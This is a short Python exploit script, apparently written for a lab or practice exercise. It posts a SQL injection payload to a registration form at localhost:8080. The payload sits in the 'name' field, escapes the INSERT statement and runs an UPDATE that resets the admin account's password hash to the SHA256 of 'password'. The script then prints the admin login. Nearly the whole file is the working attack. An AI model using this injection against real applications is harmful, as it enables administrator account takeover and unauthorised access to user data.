import requests

register_url = 'http://localhost:8080/register'

data_payload = {
    # Changes the admin password_hash to the SHA256 hashed value of the string "password"
    'name': 'Souljaboy\" , \"tellem\" , \"0\" ); update members set password_hash = \"5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\" where userid = \"admin\"; -- ',
    # These forms can contain anything, they just have to be valid options that the html won't reject
    'username' : 'username',
    'password' : 'password'    
}
response1 = requests.post(register_url, data=data_payload)
# then log in with these
print("username: admin \npassword: password")